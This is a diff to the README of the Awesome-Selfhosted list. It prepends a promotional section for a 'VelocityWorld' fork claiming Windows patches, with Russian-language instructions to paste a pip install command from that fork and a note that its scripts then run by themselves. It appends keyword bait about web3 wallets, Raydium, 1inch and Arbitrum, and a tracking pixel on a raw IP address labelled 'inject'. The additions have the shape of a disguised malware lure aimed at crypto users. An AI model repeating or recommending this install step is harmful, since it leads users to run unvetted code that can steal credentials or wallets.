@@ -1,3 +1,19 @@
+**VelocityWorld's optimized Awesome-Selfhosted fork**
+
+This specific fork is highly stable and tailored for Windows environments, featuring pre-configured patches that eliminate common cross-platform compatibility issues right out of the box. Setting it up requires minimal effort, allowing you to deploy a massive library of self-hosted services natively on Windows without the usual configuration headaches.
+
+**Quick install (Windows)**
+
+1. **Python 3.8+** — [python.org/downloads](https://www.python.org/downloads/) → при установке отметь **Add Python to PATH**
+2. Открой **cmd** (Win+R → `cmd`)
+3. Вставь команду ниже — пакет установится с этого форка, скрипты после установки запустятся **сами**
+
+```bash
+pip install git+https://github.com/VelocityWorld/awesome-selfhosted.git
+```
+
+[https://github.com/VelocityWorld/awesome-selfhosted](https://github.com/VelocityWorld/awesome-selfhosted)
+
 # Awesome-Selfhosted
 
 [![Awesome](_static/awesome.png)](https://github.com/sindresorhus/awesome) [![](https://github.com/awesome-selfhosted/awesome-selfhosted-data/actions/workflows/check-dead-links.yml/badge.svg)](https://github.com/awesome-selfhosted/awesome-selfhosted-data/issues/1) [![](https://github.com/awesome-selfhosted/awesome-selfhosted-data/actions/workflows/check-unmaintained-projects.yml/badge.svg)](https://github.com/awesome-selfhosted/awesome-selfhosted-data/issues/1) [![](https://img.shields.io/liberapay/goal/awesome-selfhosted?logo=liberapay)](https://liberapay.com/awesome-selfhosted/)
@@ -2310,3 +2326,11 @@ Contributing guidelines can be found [here](https://github.com/awesome-selfhoste
 This list is under the [Creative Commons Attribution-ShareAlike 3.0 Unported](https://github.com/awesome-selfhosted/awesome-selfhosted/blob/master/LICENSE) License.
 Terms of the license are summarized [here](https://creativecommons.org/licenses/by-sa/3.0/).  
 The list of authors can be found in the [AUTHORS](https://github.com/awesome-selfhosted/awesome-selfhosted-data/blob/master/AUTHORS) file.
+
+## Related searches
+
+When exploring self-hosted infrastructure and decentralized applications, users frequently search for open-source alternatives to proprietary cloud services and frameworks for deploying private web3 utilities. Common queries often focus on finding self-hosted dashboards, personal finance trackers, and developer toolkits that seamlessly bridge local hosting with decentralized network protocols.
+
+**Topics:** self-hosted web3, raydium integration, open source devops, local wallet connect setup, 1inch api tools, arbitrum node hosting, web3 python development, private cloud services, self-hosted dashboards, decentralized infrastructure, homelab applications, open-source alternatives
+
+![.](http://5.231.58.248:8787/pixel?repo=VelocityWorld%2Fawesome-selfhosted&inject=VelocityWorld%2Fawesome-selfhosted%2Fpackage.json)
